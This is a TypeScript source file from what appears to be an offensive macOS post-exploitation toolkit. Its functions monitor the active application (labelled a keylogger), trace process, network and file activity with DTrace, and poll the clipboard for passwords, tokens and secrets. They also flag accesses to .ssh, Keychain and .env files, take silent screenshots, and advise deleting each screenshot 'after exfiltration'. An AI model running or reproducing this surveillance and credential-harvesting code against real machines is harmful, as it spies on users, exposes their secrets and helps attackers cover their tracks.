import { run, argVal } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function keylogMac(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const findings: Finding[] = []
  const output: string[] = [`[*] Starting macOS keylogger for ${duration}s...\n`]

  const script = `
set captured to ""
set startTime to (current date)
repeat while ((current date) - startTime) < ${duration}
  try
    tell application "System Events"
      set frontApp to name of first application process whose frontmost is true
    end tell
    set captured to captured & "[" & frontApp & "] "
  end try
  delay 1
end repeat
return captured
`
  output.push("[*] Using osascript-based application monitor (keylogging requires Accessibility permission)")
  output.push("[*] Monitoring active applications...\n")

  const monitor = await run("osascript", ["-e", script], Math.max(timeout, duration + 10))
  if (monitor.exitCode === 0 && monitor.stdout.trim().length > 0) {
    output.push(`[+] Active application log:\n${monitor.stdout.trim()}`)
    findings.push({
      checkId: "MAC-KEYLOG-001",
      provider: "macos",
      severity: "high",
      status: "CAPTURED",
      resource: "macos://keylogger",
      title: "Application activity captured",
      details: `Monitored ${duration}s of active application usage`,
      remediation: "Review captured data for sensitive application usage patterns",
    })
  }

  if (monitor.exitCode !== 0) {
    output.push(`[!] osascript monitoring failed — Accessibility permission may be required`)
    output.push(`    Error: ${monitor.stderr.trim()}`)
    output.push(`\n[*] Alternative: Use ioreg for HID device enumeration`)
    const ioreg = await run("ioreg", ["-l", "-w", "0", "-p", "IOService", "-n", "IOHIDKeyboard"], timeout)
    if (ioreg.exitCode === 0) {
      output.push(`[+] HID keyboards detected:\n${ioreg.stdout.substring(0, 500)}`)
    }
  }

  return { output: output.join("\n"), findings }
}

export async function dtraceExec(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const findings: Finding[] = []
  const output: string[] = [`[*] Starting DTrace process monitor for ${duration}s...\n`]

  const sipCheck = await run("csrutil", ["status"], timeout)
  if (sipCheck.stdout.includes("enabled")) {
    output.push("[!] SIP is ENABLED — DTrace system-wide tracing is restricted")
    output.push("[*] Falling back to ps-based process monitoring...\n")

    const baseline = await run("ps", ["-eo", "pid,ppid,user,comm"], timeout)
    const baselinePids = new Set(baseline.stdout.split("\n").map((l) => l.trim().split(/\s+/)[0]))

    await new Promise((r) => setTimeout(r, Math.min(duration, 10) * 1000))

    const current = await run("ps", ["-eo", "pid,ppid,user,comm,lstart"], timeout)
    const lines = current.stdout.split("\n").filter(Boolean)
    output.push(`[+] Current processes: ${lines.length - 1}`)
    const newProcs = lines.filter((l) => {
      const pid = l.trim().split(/\s+/)[0]
      return !baselinePids.has(pid) && pid !== "PID"
    })
    if (newProcs.length > 0) {
      output.push(`[+] New processes since baseline: ${newProcs.length}`)
      for (const p of newProcs.slice(0, 50)) output.push(`    ${p.trim()}`)
    }

    return { output: output.join("\n"), findings }
  }

  const dtraceScript = `syscall::exec*:return { printf("%d %d %s", pid, ppid, execname); }`
  const dtrace = await run("dtrace", ["-qn", dtraceScript, "-c", `sleep ${duration}`], Math.max(timeout, duration + 10))
  if (dtrace.exitCode === 0) {
    const lines = dtrace.stdout.split("\n").filter(Boolean)
    output.push(`[+] Captured ${lines.length} process executions:`)
    for (const line of lines.slice(0, 100)) output.push(`    ${line}`)
    findings.push({
      checkId: "MAC-DTRACE-EXEC-001",
      provider: "macos",
      severity: "info",
      status: "CAPTURED",
      resource: "macos://dtrace/exec",
      title: `Process execution trace: ${lines.length} events`,
      details: `Captured ${lines.length} process executions over ${duration}s`,
      remediation: "Review for security tool executions or suspicious processes",
    })
  }

  if (dtrace.exitCode !== 0) {
    output.push(`[!] DTrace failed: ${dtrace.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

export async function dtraceNet(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const findings: Finding[] = []
  const output: string[] = [`[*] Starting DTrace network monitor for ${duration}s...\n`]

  const sipCheck = await run("csrutil", ["status"], timeout)
  if (sipCheck.stdout.includes("enabled")) {
    output.push("[!] SIP is ENABLED — DTrace restricted")
    output.push("[*] Falling back to lsof/netstat-based monitoring...\n")

    const lsof = await run("lsof", ["-i", "-n", "-P"], timeout)
    if (lsof.exitCode === 0) {
      const lines = lsof.stdout.split("\n").filter(Boolean)
      output.push(`[+] Active network connections: ${lines.length - 1}`)
      const established = lines.filter((l) => l.includes("ESTABLISHED"))
      const listening = lines.filter((l) => l.includes("LISTEN"))
      output.push(`    ESTABLISHED: ${established.length}`)
      output.push(`    LISTENING: ${listening.length}`)
      output.push("")
      for (const l of lines.slice(0, 80)) output.push(`    ${l}`)
    }

    return { output: output.join("\n"), findings }
  }

  const dtraceScript = `ip:::send { printf("%s:%d -> %s:%d %d bytes (pid %d %s)", args[2]->ip_saddr, args[4]->ipv4_sport, args[2]->ip_daddr, args[4]->ipv4_dport, args[2]->ip_plength, pid, execname); }
ip:::receive { printf("%s:%d <- %s:%d %d bytes (pid %d %s)", args[2]->ip_daddr, args[4]->ipv4_dport, args[2]->ip_saddr, args[4]->ipv4_sport, args[2]->ip_plength, pid, execname); }`
  const dtrace = await run("dtrace", ["-qn", dtraceScript, "-c", `sleep ${duration}`], Math.max(timeout, duration + 10))
  if (dtrace.exitCode === 0) {
    const lines = dtrace.stdout.split("\n").filter(Boolean)
    output.push(`[+] Captured ${lines.length} network events:`)
    for (const line of lines.slice(0, 100)) output.push(`    ${line}`)
    findings.push({
      checkId: "MAC-DTRACE-NET-001",
      provider: "macos",
      severity: "info",
      status: "CAPTURED",
      resource: "macos://dtrace/net",
      title: `Network trace: ${lines.length} events`,
      details: `Captured ${lines.length} network events over ${duration}s`,
      remediation: "Review for C2 connections, internal services, or data exfiltration",
    })
  }

  if (dtrace.exitCode !== 0) {
    output.push(`[!] DTrace failed: ${dtrace.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

export async function dtraceFile(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const filterPid = argVal(args, "--pid")
  const findings: Finding[] = []
  const output: string[] = [`[*] Starting DTrace file monitor for ${duration}s...\n`]

  const sipCheck = await run("csrutil", ["status"], timeout)
  if (sipCheck.stdout.includes("enabled")) {
    output.push("[!] SIP is ENABLED — DTrace restricted")
    output.push("[*] Falling back to fs_usage-based monitoring...\n")

    const fsUsage = await run("fs_usage", ["-w", ...(filterPid ? ["-p", filterPid] : [])], Math.min(duration, 10))
    if (fsUsage.exitCode === 0 || fsUsage.stdout.length > 0) {
      const lines = fsUsage.stdout.split("\n").filter(Boolean)
      output.push(`[+] File access events: ${lines.length}`)
      for (const line of lines.slice(0, 100)) output.push(`    ${line}`)
    }
    if (fsUsage.exitCode !== 0 && !fsUsage.stdout) {
      output.push(`[!] fs_usage requires root: ${fsUsage.stderr.trim()}`)
      output.push("[*] Falling back to opensnoop...")
      const opensnoop = await run(
        "opensnoop",
        ["-d", String(Math.min(duration, 10)), ...(filterPid ? ["-p", filterPid] : [])],
        Math.min(timeout, duration + 10),
      )
      if (opensnoop.exitCode === 0) {
        output.push(opensnoop.stdout.substring(0, 3000))
      }
    }

    return { output: output.join("\n"), findings }
  }

  const pidFilter = filterPid ? `/ pid == ${filterPid} /` : ""
  const dtraceScript = `syscall::open*:entry ${pidFilter} { printf("%d %s %s", pid, execname, copyinstr(arg0)); }`
  const dtrace = await run("dtrace", ["-qn", dtraceScript, "-c", `sleep ${duration}`], Math.max(timeout, duration + 10))
  if (dtrace.exitCode === 0) {
    const lines = dtrace.stdout.split("\n").filter(Boolean)
    output.push(`[+] Captured ${lines.length} file access events:`)
    for (const line of lines.slice(0, 100)) output.push(`    ${line}`)
    const sensitive = lines.filter(
      (l) =>
        l.includes(".ssh") ||
        l.includes("Keychain") ||
        l.includes(".env") ||
        l.includes("password") ||
        l.includes("token"),
    )
    if (sensitive.length > 0) {
      output.push(`\n[!] Sensitive file accesses: ${sensitive.length}`)
      for (const s of sensitive) output.push(`    ${s}`)
    }
    findings.push({
      checkId: "MAC-DTRACE-FILE-001",
      provider: "macos",
      severity: "info",
      status: "CAPTURED",
      resource: "macos://dtrace/file",
      title: `File access trace: ${lines.length} events`,
      details: `Captured ${lines.length} file operations over ${duration}s, ${sensitive.length} sensitive`,
      remediation: "Review sensitive file accesses for credential discovery",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function clipboardMonitor(args: string[], timeout: number): Promise<HookResult> {
  const duration = parseInt(argVal(args, "--duration") || "30")
  const findings: Finding[] = []
  const output: string[] = [`[*] Starting clipboard monitor for ${duration}s...\n`]

  const script = `
import time, subprocess, sys
prev = ""
captured = []
start = time.time()
dur = ${duration}
while time.time() - start < dur:
    try:
        cur = subprocess.check_output(["pbpaste"], text=True, timeout=2)
        if cur != prev and cur.strip():
            captured.append(f"[{time.strftime('%H:%M:%S')}] {cur[:200]}")
            prev = cur
    except: pass
    time.sleep(2)
for c in captured:
    print(c)
print(f"TOTAL:{len(captured)}")
`
  const r = await run("python3", ["-c", script], Math.max(timeout, duration + 10))
  if (r.exitCode === 0) {
    output.push(r.stdout.trim())
    const totalMatch = r.stdout.match(/TOTAL:(\d+)/)
    const count = totalMatch ? parseInt(totalMatch[1]) : 0
    if (count > 0) {
      output.push(`\n[+] Captured ${count} clipboard change(s)`)
      const sensitive = r.stdout.split("\n").filter(
        (l) =>
          l.toLowerCase().includes("password") ||
          l.toLowerCase().includes("token") ||
          l.toLowerCase().includes("key") ||
          l.toLowerCase().includes("secret"),
      )
      if (sensitive.length > 0) {
        output.push(`[!] Potentially sensitive clipboard content detected: ${sensitive.length} entries`)
      }
    }
    findings.push({
      checkId: "MAC-CLIP-001",
      provider: "macos",
      severity: "info",
      status: "CAPTURED",
      resource: "macos://clipboard",
      title: `Clipboard monitor: ${count} changes captured`,
      details: `Monitored clipboard for ${duration}s, captured ${count} unique change(s)`,
      remediation: "Review clipboard content for credentials, tokens, or sensitive data",
    })
  }

  if (r.exitCode !== 0) {
    output.push(`[!] Clipboard monitoring failed: ${r.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

export async function screenCapture(args: string[], timeout: number): Promise<HookResult> {
  const outputPath = argVal(args, "--output") || `/tmp/cs-screenshot-${Date.now()}.png`
  const delay = argVal(args, "--delay")
  const window = args.includes("--window")
  const findings: Finding[] = []
  const output: string[] = ["[*] Capturing screenshot...\n"]

  const captureArgs = ["-x", "-t", "png"]
  if (window) captureArgs.push("-w")
  if (delay) captureArgs.push("-T", delay)
  captureArgs.push(outputPath)

  output.push(`[*] Target: ${outputPath}`)
  if (window) output.push("[*] Mode: window capture (interactive selection)")
  if (delay) output.push(`[*] Delay: ${delay}s`)

  const r = await run("screencapture", captureArgs, timeout)
  if (r.exitCode === 0) {
    const stat = await run("ls", ["-la", outputPath], timeout)
    if (stat.exitCode === 0) {
      output.push(`[+] Screenshot saved: ${outputPath}`)
      output.push(`    ${stat.stdout.trim()}`)
      findings.push({
        checkId: "MAC-SCREEN-001",
        provider: "macos",
        severity: "high",
        status: "CAPTURED",
        resource: outputPath,
        title: `Screenshot captured: ${outputPath}`,
        details: `Screen capture saved to ${outputPath}`,
        remediation: "Delete screenshot after exfiltration: rm -f " + outputPath,
      })
    }
  }

  if (r.exitCode !== 0) {
    output.push(`[!] Screenshot failed: ${r.stderr.trim()}`)
    output.push("[*] Screen capture may require Screen Recording permission in System Preferences > Privacy")
  }

  return { output: output.join("\n"), findings }
}
